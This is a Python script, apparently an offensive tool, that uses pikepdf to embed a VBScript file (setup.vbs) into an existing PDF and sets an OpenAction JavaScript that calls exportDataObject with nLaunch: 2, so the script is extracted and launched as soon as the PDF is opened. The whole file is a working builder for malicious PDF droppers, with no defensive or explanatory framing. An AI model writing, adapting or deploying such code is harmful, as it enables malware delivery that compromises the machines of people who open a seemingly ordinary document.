import os
import sys
import pikepdf
from pikepdf import Name, Dictionary, Stream, Array, String

def find_file(extension):
    for file in os.listdir('.'):
        if file.lower().endswith(extension.lower()):
            return file
    return None

def embed_file_with_js(pdf_path, file_to_embed, output_path):
    try:
        with pikepdf.open(pdf_path, allow_overwriting_input=True) as pdf:
            ef_stream = Stream(pdf, open(file_to_embed, 'rb').read())
            ef_stream_obj = pdf.make_indirect(ef_stream)

            filespec = Dictionary({
                Name.Type: Name('Filespec'),
                Name.F: file_to_embed,
                Name.UF: file_to_embed,
                Name.EF: Dictionary({
                    Name.F: ef_stream_obj,
                    Name.UF: ef_stream_obj
                }),
                Name.Desc: "Embedded by script"
            })
            filespec_obj = pdf.make_indirect(filespec)

            if '/Names' not in pdf.Root:
                pdf.Root.Names = Dictionary()
            if '/EmbeddedFiles' not in pdf.Root.Names:
                pdf.Root.Names.EmbeddedFiles = Dictionary({
                    Name.Names: Array([file_to_embed, filespec_obj])
                })
            else:
                names = pdf.Root.Names.EmbeddedFiles.Names
                names.append(file_to_embed)
                names.append(filespec_obj)

            js_code = f"""
            try {{
                this.exportDataObject({{
                    cName: "{file_to_embed}",
                    nLaunch: 2
                }});
            }} catch (e) {{
                app.alert("Error: " + e);
            }}
            """
            js_stream = Stream(pdf, js_code.encode('utf-8'))
            js_stream_obj = pdf.make_indirect(js_stream)

            js_dict = Dictionary({
                Name.Type: Name('Action'),
                Name.S: Name('JavaScript'),
                Name.JS: js_stream_obj
            })
            js_dict_obj = pdf.make_indirect(js_dict)

            pdf.Root.OpenAction = js_dict_obj

            pdf.save(output_path)
            print(f"[+] Embedded '{file_to_embed}' and autorun added '{output_path}'")

    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

def main():
    pdf_file = find_file('.pdf')
    vbs_file = 'setup.vbs'

    if not pdf_file:
        print("[!] PDF-file not found.")
        return

    if not os.path.isfile(vbs_file):
        print("[!] setup.vbs not found.")
        return

    output_file = f"autorun_{pdf_file}"
    embed_file_with_js(pdf_file, vbs_file, output_file)

if __name__ == '__main__':
    main()
